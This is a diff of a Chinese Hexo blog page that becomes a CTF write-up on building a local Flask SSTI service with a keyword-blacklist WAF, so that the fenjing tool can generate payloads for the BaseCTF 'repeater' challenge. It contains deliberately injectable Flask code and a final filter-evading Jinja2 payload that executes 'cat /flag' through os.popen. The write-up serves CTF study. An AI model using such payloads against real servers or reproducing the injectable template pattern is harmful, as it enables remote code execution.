@@ -6,21 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://blog.zyp0422.mom">
-  <title>zhou</title>
+  <title>利用flask搭建本地ssti服务（带waf） | zhou</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-    
-    <!-- <meta name="keywords" content="">
-    <meta name="description" content=""> -->
-  
-  <meta property="og:type" content="website">
-<meta property="og:title" content="zhou">
-<meta property="og:url" content="https://blog.zyp0422.mom/page/2/index.html">
+  <meta name="description" content="前言继上篇文章模块注入-SSTI后，遇到了一些新的问题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用flask搭建本地ssti服务（带waf）">
+<meta property="og:url" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/index.html">
 <meta property="og:site_name" content="zhou">
+<meta property="og:description" content="前言继上篇文章模块注入-SSTI后，遇到了一些新的问题">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/6.png">
+<meta property="article:published_time" content="2024-09-05T02:34:38.000Z">
+<meta property="article:modified_time" content="2024-09-05T03:27:02.369Z">
 <meta property="article:author" content="zhoupeng">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -330,32 +339,53 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-
-  
-    <article id="post-pwn栈溢出-ret2syscall" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-利用flask搭建本地ssti服务（带waf）" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2syscall/" target="_blank">pwn栈溢出---ret2syscall</a>
-  
+    <h1 class="article-title" itemprop="name">
+      利用flask搭建本地ssti服务（带waf）
     </h1>
   
 
 
   
   
-<a href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2syscall/" class="archive-article-date">
-        <time datetime="2024-07-19T03:14:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-19</time>
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/" class="archive-article-date">
+        <time datetime="2024-09-05T02:34:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-09-05</time>
 </a>
 
   
   
     
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.2k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">5分</span>
+    </span>
+  </span>
+</div>
+
 
   
   </header>
@@ -363,810 +393,100 @@
   <div class="article-entry" itemprop="articleBody">
  
 
-			<h3 id="一、ret2syscall相关讲解"><a href="#一、ret2syscall相关讲解" class="headerlink" title="一、ret2syscall相关讲解"></a>一、ret2syscall相关讲解</h3><h4 id="介绍与原理"><a href="#介绍与原理" class="headerlink" title="介绍与原理"></a>介绍与原理</h4><p><em><strong>系统调用</strong></em></p>
+	
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>继上篇文章<a href="http://blog.zyp0422.mom/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/">模块注入-SSTI</a>后，遇到了一些新的问题<span id="more"></span></p>
+<p><img src="/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/1.png"></p>
+<p>正常情况下是像上面一样直接输入就可以了，这样是可以使用fenjing跑payload的</p>
+<p><img src="/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/2.png"></p>
+<p>但是有些是需要指定格式输入的，如下图需要你输入指定格式Hello，，这样你就无法通过fenjing直接跑payload</p>
+<p><img src="/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/3.png"></p>
+<p>这时候就需要通过flask在本地搭建一个ssti服务</p>
+<h3 id="flask搭建本地ssti服务"><a href="#flask搭建本地ssti服务" class="headerlink" title="flask搭建本地ssti服务"></a>flask搭建本地ssti服务</h3><h4 id="安装flask"><a href="#安装flask" class="headerlink" title="安装flask"></a>安装flask</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">pip</span> <span class="selector-tag">install</span> <span class="selector-tag">flask</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用的python3.12版本，只知道python3.11版本无法安装</p>
+<h4 id="SSTI服务脚本"><a href="#SSTI服务脚本" class="headerlink" title="SSTI服务脚本"></a>SSTI服务脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展的黑名单列表</span></span><br><span class="line">blacklist = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_check</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;简单的 WAF 检测函数，阻止常见的恶意输入&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(black <span class="keyword">in</span> input_string <span class="keyword">for</span> black <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;world&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测输入是否合法，如果网站没有waf就注释掉</span></span><br><span class="line">    <span class="keyword">if</span> waf_check(name):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NO!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 渲染模板</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Hello, <span class="subst">&#123;name&#125;</span></span></span><br><span class="line"><span class="string">    &lt;form action=&quot;/&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<ul>
+<li>blacklist：该列表是用来存放网站黑名单内容的，可以通过手动试出这个黑名单（前提是有黑名单）</li>
+<li>waf_check：一个简单的waf检测函数，用于检测输入字符串是否含有黑名单中的字符串，如果包含，返回True，表明输入是恶意的，否则返回false</li>
+<li>index：先通过上面的waf检测函数检测用户输入是否合法，如果合法就通过render_template_string渲染出一个简单的HTML模块</li>
+</ul>
+<p>模块分析</p>
+<ul>
+<li>flask：提供构建Web应用程序的基本框架，相较于其他Web框架，flask是一个轻量级Web框架，可以快速构建和部署</li>
+<li>request：用于获取请求数据，比如表单输入</li>
+<li>render_template_string：用于从字符串渲染模块，脚本总就是将字符串渲染成一个html页面，并反馈给客户端</li>
+<li>Template：<code>Template</code> 是 <code>jinja2</code> 模板引擎的一部分，可以用来创建和渲染模板，在render_template_string<code>内部使用了</code>jinja2</li>
+</ul>
+<p>接着就可以用fenjing跑payload了</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>题目：BaseCTF[Week3] 复读机</p>
+<p>打开题目，如下图，要求我们必须输入开头BaseCTF，这也就导致了我们无法直接使用fenjing跑payload了</p>
+<p><img src="/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/4.png"></p>
+<p>且题目过滤了许多，通过手动试出过滤内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lipsum&#x27;</span>, <span class="string">&#x27;cycler&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;reverse&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>搭建本地ssti服务</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展的黑名单列表</span></span><br><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lipsum&#x27;</span>, <span class="string">&#x27;cycler&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;reverse&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_check</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;简单的 WAF 检测函数，阻止常见的恶意输入&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(black <span class="keyword">in</span> input_string <span class="keyword">for</span> black <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;world&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测输入是否合法</span></span><br><span class="line">    <span class="keyword">if</span> waf_check(name):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NO!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 渲染模板</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Hello, <span class="subst">&#123;name&#125;</span></span></span><br><span class="line"><span class="string">    &lt;form action=&quot;/&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>启动服务并使用fenjing跑payload</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">-m</span> <span class="selector-tag">fenjing</span> <span class="selector-tag">scan</span> <span class="selector-tag">--url</span> &quot;<span class="selector-tag">http</span>:<span class="comment">//192.168.1.192:5000&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/5.png"></p>
+<p>横线中间的就是我们的payload，这时候只需要在开头加上BaseCTF就可以获取flag了</p>
+<p>最终paylaod</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">BaseCTF</span>&#123;%<span class="selector-tag">set</span> <span class="selector-tag">in</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">i</span>&#x27;&#x27;<span class="selector-tag">nit</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">gl</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">g</span>&#x27;&#x27;<span class="selector-tag">lobals</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">bu</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">b</span>&#x27;&#x27;<span class="selector-tag">uiltins</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">im</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">import</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">fu</span>=&#x27;<span class="selector-tag">OS</span>&#x27;|<span class="selector-tag">lower</span>%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">ca</span>=&#x27;%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>&#x27;%(<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>)%&#125;&#123;%<span class="selector-tag">print</span> <span class="selector-tag">joiner</span><span class="selector-attr">[in]</span><span class="selector-attr">[gl]</span><span class="selector-attr">[bu]</span><span class="selector-attr">[im]</span>(fu)<span class="selector-attr">[<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>]</span>(ca)<span class="selector-attr">[<span class="string">&#x27;read&#x27;</span>]</span>()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/6.png"></p>
+
 	
 
 
 
     
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2syscall/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-        
-        
+      </a>
     </div>
-</aside>
-
-
-
-  
-    <article id="post-pwn栈溢出-ret2libc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2libc/" target="_blank">pwn栈溢出---ret2libc</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2libc/" class="archive-article-date">
-        <time datetime="2024-07-17T03:52:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-17</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h3 id="一、libc相关讲解"><a href="#一、libc相关讲解" class="headerlink" title="一、libc相关讲解"></a>一、libc相关讲解</h3><h4 id="1、为什么要libc泄露"><a href="#1、为什么要libc泄露" class="headerlink" title="1、为什么要libc泄露"></a>1、为什么要libc泄露</h4><ul>
-<li><p>题目没有给出system()和&#x2F;bin&#x2F;sh给我们利用，需要我们在libc库中寻找</p></li></ul>
-	
-
-
-
     
 
     
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2libc/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          zhoupeng
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://blog.zyp0422.mom/利用flask搭建本地ssti服务（带waf）/" title="利用flask搭建本地ssti服务（带waf）" target="_blank">https://blog.zyp0422.mom/利用flask搭建本地ssti服务（带waf）/</a>
+        </li>
         
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
+        <li>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
         
-        
+      </ul>
     </div>
-</aside>
-
-
-
-  
-    <article id="post-pwn栈溢出入门篇" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/" target="_blank">pwn栈溢出入门篇</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/" class="archive-article-date">
-        <time datetime="2024-07-16T03:49:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-16</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h3 id="一、前言介绍"><a href="#一、前言介绍" class="headerlink" title="一、前言介绍"></a>一、前言介绍</h3><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E7%AF%87/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
